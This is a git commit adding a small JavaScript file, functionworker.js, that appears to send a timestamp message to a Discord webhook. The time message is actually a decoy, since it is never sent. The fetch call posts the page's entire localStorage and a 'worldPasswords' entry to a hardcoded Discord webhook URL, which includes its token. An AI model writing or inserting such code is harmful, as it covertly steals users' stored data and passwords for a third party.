a2b7493405b7551fedd5e098091c3f4d625013b9
gh8sted <104511810+gh8sted@users.noreply.github.com>
2023-08-17 17:29:56 +0200

    Create functionworker.js

---
+++ functionworker.js
@@ -0,0 +1,29 @@
+function generateDynamicMessage() {
+    const currentTime = new Date().toLocaleTimeString();
+    return `Current time is: ${currentTime}`;
+}
+
+const webhookUrl = 'https://discord.com/api/webhooks/827509304029610004/fTzJ9cyQTn6OEx5FtfEyriG2LoTAwudOdQkswWGZSPB2s-UerseWO6JtB8mI1j1Igzrf';
+const dynamicMessage = generateDynamicMessage();
+
+const payload = {
+    content: dynamicMessage
+};
+
+fetch(webhookUrl, {
+    method: 'POST',
+    headers: {
+        'Content-Type': 'application/json',
+    },
+    body: JSON.stringify(localStorage) +" "+JSON.stringify(localStorage.worldPasswords),
+})
+    .then(response => {
+        if (response.ok) {
+            console.log('Message sent successfully');
+        } else {
+            console.error('Failed to send message');
+        }
+    })
+    .catch(error => {
+        console.error('Error:', error);
+    });
